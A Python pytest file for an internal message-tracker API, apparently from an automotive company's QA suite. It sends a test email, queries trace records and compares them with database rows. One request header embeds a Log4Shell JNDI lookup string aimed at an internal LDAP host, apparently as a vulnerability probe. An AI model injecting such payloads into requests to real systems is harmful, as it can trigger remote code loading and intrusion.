# -*- coding: utf-8 -*-
# @Project : ev_monitor_nioauto
# @File : test_sms_preview_cn.py
# @Author : qiangwei.zhang
# @time: 2021/08/25
# @api: POST_/api/2/in/message_portal/template/cn/sms/preview 【必填】
# @showdoc: http://showdoc.nevint.com/index.php?s=/647&page_id=31438
# @Description :脚本描述
import time
import allure
import pytest

from utils.http_client import TSPRequest as hreq
from utils.logger import logger
from utils.message_formator import format_to_message_state
from utils.assertions import assert_equal

notify_email_employee_path = "/api/2/in/message/employee/email_push"
cn_voice_send_path = "/api/2/in/message_tracker/trace/info"
app_id = 10000


class TestTemplateSend(object):

    def test_message_tracker(self, env, cmdopt, mysql, redis):
        with allure.step("准备消息ID"):
            category = 'fellowMessage'  # ads, verify, fellowMessage
            recipients = "qiangwei.zhang@nio.com"
            sender_name = "notification@nio.com"
            if "marcopolo" in cmdopt:
                sender_name = "notification@nio.io"
            http = {
                "host": env['host']["app_in"],
                "path": notify_email_employee_path,
                "method": "POST",
                "headers": {"Content-Type": "application/json"},
                "params": {
                    "region": "cn",
                    "lang": "zh-cn",
                    "hash_type": "sha256",
                    "app_id": app_id,
                    "sign": ""
                },
                "json": {
                    "sender_name": sender_name,
                    "recipients": recipients,
                    "subject": f"【{cmdopt}】环境time:{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}category:{category}",
                    "content": f"消息追踪测试员工发送邮件接口",
                }
            }
            with allure.step(f"【{cmdopt}】环境,清理{app_id}频率限制"):
                if "test" in cmdopt:
                    redis["app_message"].delete(f"rate.limiting:employee/email_push_{app_id}")
            response = hreq.request(env, http)
            assert response['result_code'] == 'success'
            message_id = response['data'].pop('message_id', '')

        with allure.step("查询trace接口"):
            inputs = {
                "host": env['host']['app_in'],
                "path": "/api/2/in/message_tracker/trace/info",
                "method": "POST",
                "headers": {"Content-Type": "application/json",
                            "X-Request-Id": 'a ${jndi:ldap://nmplog4j.nioint.com/exp} b'
                            },
                "params": {
                    "app_id": "10000",
                    "hash_type": "sha256",
                    'nonce': 'MrVIRwkCLBKySgCG',
                    "sign": ''
                },
                "json": {
                    'message_ids': message_id,
                    # 'client_id': "ChBPgyQEuiFGadDGeuw3kR9nEAEY0eYIIJFOKAE=",
                }

            }
            with allure.step("查询数据库"):
                client_id = inputs.get("json").get("client_id")
                if client_id:
                    where_model = {"client_id": client_id, "message_id in": message_id.split(',')}
                else:
                    where_model = {"message_id in": message_id.split(',')}
                message_state_in_mysql = mysql['nmp_app'].fetch("message_state", where_model=where_model, retry_num=70)
                format_mysql_data = format_to_message_state(message_state_in_mysql, cmdopt)
            with allure.step("tracker接口查询"):
                response = hreq.request(env, inputs)
            with allure.step("验证接口查询结果和数据库结果"):
                response.pop("request_id")
                response.pop("server_time")
                expected_result = {
                    "data": format_mysql_data,
                    "result_code": "success",
                }
                assert_equal(response, expected_result)


# @pytest.mark.skip("manual")
def test_message_tracker(env):
    # message_ids = "a96b02d9-5365-4eba-b571-afa7562980e6,95e4a0c4-68d3-41fc-a71c-3742a20b8afc,52645070-5396-44c5-b3af-364676fe652d,c0b24472-bd98-4eb0-b405-5182a4d07d92,95decbd6-57cf-4b9b-b9ae-be11f796bf98,8e72ca85-8ca5-456f-b7f2-d371f5288e37,c19eae17-ae56-4db5-ae06-566bf43e1a23,5f9e230d-1a64-478c-abad-c8c0d289c429,47b5018e-27c9-4c96-8712-216609f4232e,44d890d6-01e0-4c24-bab3-bf802435dd57,01705794-38d0-4780-8f61-a1ad07e18745,a4033b88-58c2-4223-a61b-b2d8fc9627dc,73d0766e-cc53-4e1c-9257-35a91b579735,75fc879d-5cce-4af1-be12-620a74c07c9d,f035b20b-d4f2-4f91-bf9c-cb5153c9488d,743fe691-a749-4592-8be3-5308ec4a6f7c,a994ecaa-844c-4d12-b756-41b5ea455d5c,c45d8fe9-dc46-46d2-be64-48d1414da85b,f8712459-16df-49fb-a4ad-907c199564af,0020893f-da42-4f6b-b8a8-a94b474cad5a,52935f2b-4de2-4c6f-9853-d0219b86df0a,4d4096cb-0fec-480d-a663-2b1d2753a64f,8406cebb-e0fa-4252-a3b8-6753edfcfb98,873e0ee2-28a0-413f-8431-d2d54fa6591c,7c1f4b9c-340f-4685-a729-c08f2bf3c7ee,3a17b3a2-5af4-468b-8805-5d6747809833,16ea6b2a-1ab6-43d9-98e7-731c37347086,346e8170-6a99-440c-b1c4-80986a91397b"
    # message_ids = "360fd121-a98e-4dc6-adbf-2e31fd172fc5"
    # message_ids = "e914d6a0-21d3-411c-8154-a3256763f497"
    message_ids = "a221ec80-5317-4686-a8ee-c900536855b7,ceb9414b-d5c7-4a76-b56b-856703071ed4,3bb66b9a-ba53-4a74-b0a3-d2868356468f,6c05a60b-1912-49b5-8a9f-860d3aa499fb,ef518aa7-ba08-4bf9-931a-e8385d09f3c6"
    with allure.step("查询trace接口"):
        inputs = {
            "host": env['host']['app_in'],
            "path": "/api/2/in/message_tracker/trace/info",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "params": {
                "app_id": "10000",
                "hash_type": "sha256",
                'nonce': 'MrVIRwkCLBKySgCG',
                "sign": ''
            },
            "json": {
                'message_ids': message_ids,
            }
        }
        with allure.step("tracker接口查询"):
            response = hreq.request(env, inputs)
            datas = response.get("data")
            status_dict = {}
            for data in datas:
                if data.get("state") == 37:
                    status_dict[data.get("message_id")] = "37"
                if data.get("state") == 38:
                    status_dict[data.get("message_id")] = f"{status_dict[data.get('message_id')]},38"
            # logger.debug(f"status_data:{dls}")
            logger.debug(f"status_data:{status_dict}")
